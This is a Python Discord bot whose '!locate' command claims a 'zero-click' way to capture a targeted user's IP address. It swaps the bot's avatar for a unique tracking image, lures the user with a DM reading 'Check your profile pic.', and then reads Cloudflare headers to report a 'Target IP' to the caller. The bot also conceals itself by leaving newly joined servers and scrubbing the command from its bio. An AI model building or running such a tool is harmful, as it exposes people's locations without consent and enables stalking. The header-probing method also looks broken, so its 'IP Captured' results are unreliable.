import discord
from discord.ext import commands
import requests
import os
import random
import string
from http.server import HTTPServer, SimpleHTTPRequestHandler
import threading
import time
import asyncio

# Get token from Railway env vars
TOKEN = os.getenv('DISCORD_TOKEN')
if not TOKEN:
    raise ValueError("DISCORD_TOKEN environment variable is not set!")

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Keep-alive for Railway
def keep_alive():
    server = HTTPServer(('0.0.0.0', 8080), SimpleHTTPRequestHandler)
    print("Keeping alive...")
    server.serve_forever()

p = threading.Thread(target=keep_alive)
p.start()

# Store guilds present at startup
initial_guild_ids = None

@bot.event
async def on_ready():
    global initial_guild_ids
    
    # Remove "!locate" from bio if present
    await update_bio_if_needed()
    
    print(f'Bot ready! Logged in as {bot.user}')
    
    # Capture the IDs of all guilds the bot is currently in
    initial_guild_ids = [g.id for g in bot.guilds]
    print(f"Initial Guilds: {len(initial_guild_ids)}")
    
    await bot.change_presence(activity=discord.Game(name=""))

@bot.event
async def on_guild_join(guild):
    # If we have an initial list, check if this guild is NOT in it
    if initial_guild_ids and guild.id not in initial_guild_ids:
        print(f"New guild joined: {guild.name} ({guild.id}). Leaving...")
        try:
            await guild.leave()
            print(f"Left guild: {guild.name}")
        except Exception as e:
            print(f"Failed to leave {guild.name}: {e}")

@bot.command()
async def locate(ctx, user: discord.User):
    """
    0-Click Method with DM Trigger:
    1. Sets bot avatar to a unique URL.
    2. Sends a DM to force the user to open the chat window.
    3. User's client loads the avatar -> IP logged.
    4. We probe the log to get the IP.
    """
    # Check if the command was run in DMs
    if ctx.guild is None:
        return 

    # 1. Generate a unique ID for this specific scan
    random_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    
    # Use httpbin.org because it reliably passes through Cloudflare headers like cf-connecting-ip
    img_url = f"https://httpbin.org/image/png?r={random_id}" 
    
    # 2. Set the Avatar IMMEDIATELY
    try:
        resp = requests.get(img_url)
        if resp.status_code == 200:
            await ctx.bot.user.edit(avatar=resp.content)
            print(f"Avatar set to: {img_url}")
        else:
            await ctx.send("Failed to download avatar image.")
            return
    except Exception as e:
        await ctx.send(f"Error setting avatar: {e}")
        return

    # 3. Send a DM to trigger the chat load
    # This ensures the target sees the bot in their DM list and potentially clicks/opens it
    try:
        await user.send("Check your profile pic.") 
    except discord.Forbidden:
        await ctx.send(f"Cannot DM {user.name}. They may have DMs disabled.")
        return

    # 4. Wait for the target's client to fetch the avatar
    # Opening the DM usually triggers the avatar load immediately.
    await asyncio.sleep(15)

    # 5. Probe Cloudflare Headers to get the IP
    headers = {'User-Agent': 'Mozilla/5.0'}
    
    try:
        start_time = time.time()
        # HEAD request is faster and less intrusive than GET
        probe_resp = requests.head(img_url, headers=headers, timeout=5)
        elapsed = time.time() - start_time
        
        cf_status = probe_resp.headers.get('cf-cache-status', 'Unknown')
        
        # --- CRITICAL: Extract Public IP ---
        target_ip = probe_resp.headers.get('cf-connecting-ip', 'Not Found')
        
        if probe_resp.status_code == 200:
            if cf_status == 'HIT':
                result_msg = f"✅ **IP Captured!**\n🌐 **Target IP:** `{target_ip}`\n📡 **Cache:** HIT (They loaded your profile)"
            elif cf_status == 'MISS':
                # Even on MISS, if they clicked/loaded it, the IP might still be logged by CF depending on region/settings
                result_msg = f"⚠️ **IP Attempted:** `{target_ip}`\n📡 **Cache:** MISS\n💡 Note: If IP is 'Not Found', they may not have loaded the image yet."
            else:
                result_msg = f"ℹ️ **Status:** {probe_resp.status_code}\n🌐 **IP:** `{target_ip}`"
                
            await ctx.send(result_msg)
            
        else:
            await ctx.send(f"❌ Failed to probe image. Status: {probe_resp.status_code}")

    except Exception as e:
        await ctx.send(f"Error probing: {e}")

async def update_bio_if_needed():
    """Checks if '!locate' is in the bio and removes it."""
    try:
        await bot.fetch_user(bot.user.id)
        current_bio = bot.user.bio or ""
        if "!locate" in current_bio:
            new_bio = current_bio.replace("!locate", "").strip()
            while "  " in new_bio:
                new_bio = new_bio.replace("  ", " ")
            if new_bio != current_bio:
                await bot.user.edit(bio=new_bio if new_bio else None)
                print(f"Bio updated: removed '!locate'")
    except Exception as e:
        print(f"Error updating bio: {e}")

bot.run(TOKEN)